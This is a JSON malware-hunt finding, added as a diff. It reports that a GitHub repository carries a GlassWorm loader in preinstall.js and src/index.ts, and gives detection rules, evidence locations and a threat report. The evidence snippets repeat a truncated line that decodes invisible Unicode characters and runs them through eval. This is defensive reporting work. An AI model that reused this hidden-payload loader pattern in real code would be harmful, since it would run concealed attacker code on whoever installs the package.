@@ -1,0 +1,109 @@
+{
+  "finding": {
+    "key": "repository:prodkt-cloud/prodkt-frontend-api",
+    "kind": "repository",
+    "family": "",
+    "id": "prodkt-cloud/prodkt-frontend-api",
+    "url": "https://github.com/Prodkt-Cloud/prodkt-frontend-api",
+    "registry": "github",
+    "owner": "prodkt-cloud",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 2,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "malware_signature/invisible-unicode-payload; malware_signature/glassworm-ioc",
+    "evidence_locations": "preinstall.js:1; src/index.ts:20",
+    "c2_hosts": "",
+    "iocs": "preinstall.js",
+    "matched_signatures": "codePointAt 0xFE00 0xE0100 eval; codePointAt 0xFE00 0xE0100 Function",
+    "reasons": "Shares a confirmed-malware code signature ['codePointAt 0xFE00 0xE0100 eval', 'codePointAt 0xFE00 0xE0100 Function'] | Tier-2 confirmed (bash score 2)",
+    "osm_status": "submitted",
+    "osm_threat_id": "56c9cd3f-7270-40ed-88d2-b2b41332fbf4",
+    "first_seen": "hunt-20261011T214533Z",
+    "last_seen": "hunt-20261011T214533Z",
+    "evidence_file": "repositories/prodkt-cloud_prodkt-frontend-api.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "preinstall.js",
+      "line": 1,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "preinstall.js",
+      "line": 1,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/index.ts",
+      "line": 20,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/index.ts",
+      "line": 20,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "preinstall.js",
+      "line": 1,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "preinstall.js",
+      "line": 1,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/index.ts",
+      "line": 20,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/index.ts",
+      "line": 20,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    }
+  ],
+  "commit_sha": "0ddb036b9bcb851b55559f8d71b72c70b68d06e6",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/prodkt-cloud/prodkt-frontend-api",
+    "version_info": "all",
+    "threat_description": "GlassWorm loader (invisible Unicode payload, Solana dead-drop C2). Payload in preinstall.js, src/index.ts.\nOutbound: documented for this malware family (preinstall.js:1).\nThe same dropper is planted in 2 directories.\nFound by GitHub code search for a confirmed malware signature: codePointAt 0xFE00 0xE0100 eval; codePointAt 0xFE00 0xE0100 Function.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: preinstall.js, src/index.ts\n- Outbound: documented for this malware family (preinstall.js:1).\n- preinstall.js:1: long run of invisible Unicode variation selectors: an encoded payload that renders as an empty string (+1 more)\n- preinstall.js:1: GlassWorm/ForceMemo fingerprint (variation-selector decoder, Solana dead-drop wallet, ForceMemo marker or C2 address) (+1 more)",
+    "publisher": "prodkt-cloud",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "glassworm",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/prodkt-cloud/prodkt-frontend-api/blob/0ddb036b9bcb851b55559f8d71b72c70b68d06e6/preinstall.js#L1\nhttps://github.com/prodkt-cloud/prodkt-frontend-api/blob/0ddb036b9bcb851b55559f8d71b72c70b68d06e6/src/index.ts#L20",
+    "verified_iocs": "preinstall.js",
+    "contributors": [],
+    "first_seen": "2026-10-11T21:45:33Z",
+    "last_seen": "2026-10-11T21:45:33Z"
+  }
+}
